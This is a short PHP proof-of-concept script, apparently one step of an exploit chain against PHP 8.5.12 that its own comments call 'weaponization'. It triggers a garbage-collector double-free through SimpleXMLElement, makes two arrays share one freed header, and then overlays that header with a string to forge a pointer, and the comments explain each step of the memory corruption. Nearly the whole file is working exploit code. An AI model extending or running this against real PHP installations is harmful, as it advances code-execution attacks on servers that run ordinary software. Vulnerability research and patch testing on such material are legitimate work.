<?php
// P13 — GC double-free -> shared zend_array header -> forged arData.
// Milestone 1 of the 8.5.12 weaponization (no cheating: silent ZendMM path).
//
// 1. GH-24050 regression double-frees the sxe properties zend_array (56B bin)
//    inside one gc_collect_cycles() call (verified in gdb: free@2142 + free@2170).
// 2. LIFO bin => the next two array headers ($a, $b) get the SAME address.
// 3. unset($a) frees the shared header while $b still references it.
// 4. $s = 31-char string reclaims the 56B block; its bytes overlay the header:
//    arData field (header+0x10) = string bytes 8..15 = 0x4141414141414141.
// 5. Any write to $b walks the forged arData => fault at 0x4141414141414141.
$xml = new SimpleXMLElement('<root a="1"><b>2</b></root>');
$x = (array)$xml;
$w = new stdClass(); $w->x = $xml; $w->self = $w;
unset($xml, $x, $w);
gc_collect_cycles();            // silent double-free on stock ZendMM
$a = ["pad" => 1];              // header alloc #1 = doubly-freed block
$b = ["pad" => 2];              // header alloc #2 = same address
unset($a);                      // header freed (arData of the pad bucket freed too)
$s = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";  // 31 chars -> 56B alloc, reclaims header
$b["k"] = 1;                    // write through forged header
echo "no crash (miss)\n";
